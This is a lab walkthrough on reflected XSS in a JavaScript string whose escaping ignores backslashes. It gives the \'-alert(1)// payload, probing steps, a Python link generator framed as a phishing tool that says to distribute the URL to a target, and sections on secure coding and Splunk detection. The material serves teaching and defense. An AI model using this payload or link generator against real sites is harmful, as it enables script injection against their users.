
# Lab Walkthrough: Reflected XSS into a JavaScript String (Angle Brackets HTML-Encoded, Single Quotes Escaped)

* **Vulnerability Type:** Reflected Cross-Site Scripting (XSS)
* **Target Context:** Client-Side JavaScript String Literal (Flawed Escaping)
* **Skill Level:** Practitioner (Intermediate)
* **Estimated Completion Time:** 15–20 minutes
* **Lab Status:** Solved

---

## Legal & Ethical Disclaimer

> [!WARNING]  
> The methodologies, payloads, and technical documentation contained in this repository are strictly for educational purposes, CTF preparation, and authorized security assessments. Executing these tests against infrastructure without prior, explicit, written engagement contracts is illegal.

---

## Table of Contents

1. [Vulnerability Architecture & Mechanism](#1-vulnerability-architecture--mechanism)
2. [Lab Objectives & Verification Criteria](#2-lab-objectives--verification-criteria)
3. [Step-by-Step Exploitation Flow](#3-step-by-step-exploitation-flow)
4. [Execution Insight: Escaping the Escaper](#4-execution-insight-escaping-the-escaper)
5. [Automated Exploitation Script (Python PoC)](#5-automated-exploitation-script-python-poc)
6. [Defense, Hardening & Secure Coding](#6-defense-hardening--secure-coding)
7. [SIEM Detection & Telemetry Analysis](#7-siem-detection--telemetry-analysis)
8. [Troubleshooting & Diagnostic Runbook](#8-troubleshooting--diagnostic-runbook)

---

## 1. Vulnerability Architecture & Mechanism

When reflecting user input inside a JavaScript string block, developers commonly escape single quotes (`'`) by prepending a backslash (`\'`) to prevent the string from being closed prematurely. However, if the developer fails to also escape incoming backslashes, an attacker can neutralize the escaping mechanism.

* **The Core Flaw:** The application securely HTML-encodes angle brackets (`<` and `>`), structurally preventing a `<script>` breakout. It also escapes single quotes (`'` becomes `\'`). Crucially, it leaves user-supplied backslashes (`\`) untouched.
* **The Mechanism:** An attacker provides a backslash immediately followed by a single quote (`\'`). The server blindly sanitizes the single quote by adding its own backslash, resulting in `\\'`. In JavaScript syntax, a double backslash resolves to a single literal backslash character within the string, which leaves the trailing single quote completely unescaped and active as a string terminator.
* **Real-World Analogy:** You hire a security guard (the backend) whose only job is to neutralize weapons (single quotes) by putting a locked case (a backslash) over them. You approach the guard carrying your own locked case, followed by a weapon. The guard rigidly follows instructions and puts a locked case over your weapon. Because two cases cancel each other out in this system, the weapon slips out completely unguarded.

```text
┌────────────────────────────────────────────────────────────────────────┐
│                   ESCAPING NEUTRALIZATION FLOW                         │
└────────────────────────────────────────────────────────────────────────┘

  [1. Attacker Input] 
  \'-alert(1)//
           │
           ▼
  [2. Server Backend (Flawed Sanitization)]
  Rule: Add '\' before every '''. Ignore existing '\'.
  Input becomes: \\'-alert(1)//
           │
           ▼
  [3. Rendered DOM]
  <script>
      var searchTerms = '\\'-alert(1)//';
  </script>
           │
           ▼
  [4. Browser Execution]
  '\\'       -> Evaluates to a literal string containing one backslash.
  '          -> Closes the string boundary.
  - alert(1) -> Subtracts the return value of alert() from the string.
  //';       -> Comments out the server's leftover syntax.

```

---

## 2. Lab Objectives & Verification Criteria

* **Target Surface:** The search query tracking functionality (`/?search=`).
* **Primary Objective:** Exploit the flawed string escaping mechanism to break out of the JavaScript string boundary and execute the `alert()` function without using angle brackets.
* **Validation Signal:** The lab is marked solved when the `alert(1)` pop-up executes in the browser.

---

## 3. Step-by-Step Exploitation Flow

### Phase 1: Context Mapping & Sanitization Probing

* Inject a distinct string into the search bar: `CyberTest`.
* Intercept the request and view the response source code.
* *Observation:* The input is reflected inside a JavaScript variable: `var searchTerms = 'CyberTest';`.
* **Probe 1 (Angle Brackets):** Test `<script>`.
* *Result:* Reflected as `&lt;script&gt;`. Script breakout is impossible.


* **Probe 2 (Quotes):** Test `test'payload`.
* *Result:* Reflected as `test\'payload`. The string is secure.


* **Probe 3 (Backslashes):** Test `test\payload`.
* *Result:* Reflected as `test\payload`. The backslash is **not** escaped. A vulnerability exists.



### Phase 2: Payload Construction

* Combine the unescaped backslash with the single quote to neutralize the server's defense.
* **The Injection:** `\'-alert(1)//`
1. `\` : Attacker's backslash.
2. `'` : Attacker's quote (Server prepends a second `\` here).
3. `-` : Arithmetic operator to separate the closed string from the function call.
4. `alert(1)` : The execution sink.
5. `//` : Single-line comment to cleanly truncate the remainder of the line.



### Phase 3: Execution

* Inject the payload into the search bar.
* *Result:* The backend renders `var searchTerms = '\\'-alert(1)//';`. The JS engine parses the string, triggers the mathematical subtraction, and executes the `alert()`.

---

## 4. Execution Insight: Escaping the Escaper

In JavaScript, string literals use the backslash as an escape character.

* `\'` resolves to a literal quote.
* `\n` resolves to a new line.
* `\\` resolves to a single literal backslash.

When the server renders `\\'`, the JavaScript engine consumes the first two characters (`\\`) and interprets them as a single backslash character belonging *inside* the string. The very next character (`'`) is now completely detached from the escape sequence. Because it is unescaped, it instructs the JavaScript engine to close the string boundary.

The minus sign (`-`) is then used as a syntax bridge. JavaScript expects operators between discrete data types. While `var x = 'string' alert(1)` throws a Syntax Error, `var x = 'string' - alert(1)` is perfectly valid syntax (evaluating to `NaN`), permitting the function call to fire.

---

## 5. Automated Exploitation Script (Python PoC)

This script generates the URL-encoded weaponized link designed to exploit the flawed escaping mechanism.

```python
#!/usr/bin/env python3
"""
Reflected XSS (Flawed Escaping) Weaponized Link Generator
Exploits backslash-blind sanitization within a JavaScript string context.
"""

import urllib.parse
import sys

def generate_phishing_link(target_url):
    # Payload designed to neutralize server-side quote escaping
    raw_payload = r"\'-alert(1)//"
    
    # URL encode the payload for safe HTTP transport
    encoded_payload = urllib.parse.quote(raw_payload)
    
    # Construct the final weaponized URL
    weaponized_link = f"{target_url}/?search={encoded_payload}"
    
    print("[*] Generating Weaponized XSS Link...")
    print(f"[+] Distribute this URL to target: \n{weaponized_link}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 escaping_bypass_xss.py <target_base_url>")
        sys.exit(1)
        
    target = sys.argv[1].rstrip('/')
    generate_phishing_link(target)

```

---

## 6. Defense, Hardening & Secure Coding

Custom string escaping routines are notoriously fragile.

* **Comprehensive Escaping (Primary Defense):** If you must dynamically reflect data into a JavaScript string on the server side, you must escape **both** quotes and backslashes.
* *Rule:* Before encoding quotes, always replace `\` with `\\`.


* **Use JSON Serialization:** The safest way to embed dynamic data into a JavaScript context from the backend is to serialize it as JSON. Modern backend frameworks (like Django, Rails, or ASP.NET) have built-in, secure functions for this.
* *Secure Pattern (Node.js/Express example):*
`var searchTerms = <%- JSON.stringify(userInput) %>;`
* `JSON.stringify` automatically and securely handles all edge cases regarding quotes, backslashes, and control characters.


* **HTML `data-*` Attributes:** Alternatively, reflect the safely HTML-encoded data into a `data-*` attribute on a DOM element, and retrieve it on the client side using `element.dataset`.

---

## 7. SIEM Detection & Telemetry Analysis

Detecting this specific bypass requires monitoring for the explicit combination of backslashes, quotes, and mathematical/logical operators.

### Splunk Search Query (SPL)

```spl
index=web_proxy sourcetype=access_combined 
| eval decoded_query=urldecode(uri_query)
| regex decoded_query="(?i)\\\\'(-|\+|\*|/|;).*?(alert|eval|prompt|confirm)"
| stats count by src_ip, uri_path, decoded_query
| where count > 0

```

*Indicator of Attack (IoA):* The specific sequence of a backslash followed by a single quote (`\'`), immediately followed by a mathematical operator (`-`, `+`) and a JavaScript function, is highly indicative of an attacker exploiting a backslash-blind escaping routine.

---

## 8. Troubleshooting & Diagnostic Runbook

| Symptom | Probable Cause | Corrective Action |
| --- | --- | --- |
| **Payload renders as `\'-alert(1)//` and throws a SyntaxError** | Missing operator. | Ensure you included the minus sign (`-`) or a semicolon (`;`) after the quote. `\''alert(1)//` is invalid JS syntax and will fail to execute. |
| **Payload appears literally on screen (No alert)** | Safe JSON implementation. | The application might have been updated to use secure serialization. View the source code; if you see `var searchTerms = "\\'-alert(1)//";` (double quotes securely handling the payload), this specific vector is mitigated. |
| **Console Error: `Unexpected identifier**` | Incomplete commenting. | Ensure you appended the `//` at the end of the payload to successfully comment out the application's trailing `'` and `;` characters. |

---

> **Key Insight:** Security controls must handle the complete grammar of the target execution context. Escaping quotes prevents string breakout, but failing to escape the escape character itself (the backslash) leaves the control mechanism completely in the hands of the attacker.
